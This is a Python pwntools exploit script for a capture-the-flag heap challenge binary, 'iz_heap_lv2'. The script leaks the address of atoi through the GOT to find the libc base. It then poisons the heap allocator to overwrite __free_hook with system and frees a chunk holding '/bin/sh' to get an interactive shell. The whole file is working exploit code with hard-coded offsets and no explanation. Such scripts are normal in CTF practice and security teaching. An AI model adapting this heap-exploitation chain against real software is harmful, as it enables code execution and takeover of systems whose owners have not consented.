from pwn import *

r = process('./iz_heap_lv2')
raw_input('debug')
free_hook_offset = 0x3ed8e8
atoi_offset = 0x40730
atoi_got = 0x601fe0
system_offset = 0x04f4e0

def add(size, data):
	r.sendlineafter('Choice: ', '1')
	r.sendlineafter('Enter size: ', str(size))
	r.sendafter('Enter data: ', data)

def edit(ind, data):
	r.sendlineafter('Choice: ', '2')
	r.sendlineafter('Enter index: ', str(ind))
	r.sendafter('Enter data: ', data)

def delete(ind):
	r.sendlineafter('Choice: ', '3')
	r.sendlineafter('Enter index: ', str(ind))

def show(ind):
	r.sendlineafter('Choice: ', '4')
	r.sendlineafter('Enter index: ', str(ind))

add(0x6020f0, 'linh')
add(0xb1, '/bin/sh\x00')
add(0x20, 'b'*9)
add(atoi_got, 'linh')
show(23)
r.recvuntil('Data: ')
atoi_add = u64(r.recv(6) + '\x00'*2)
log.info('atoi_add %#x' %atoi_add)
libc_base = atoi_add - atoi_offset
free_hook_add = libc_base + free_hook_offset
system_add = libc_base + system_offset

delete(20)
delete(0)
add(0x6020f0, 'linh')
delete(20)
add(0xa0, p64(free_hook_add))
add(0xa0, p64(0x0))

log.info('write system_add')
add(0xa0, p64(system_add))
delete(1)

r.interactive()
r.close()

# FLAG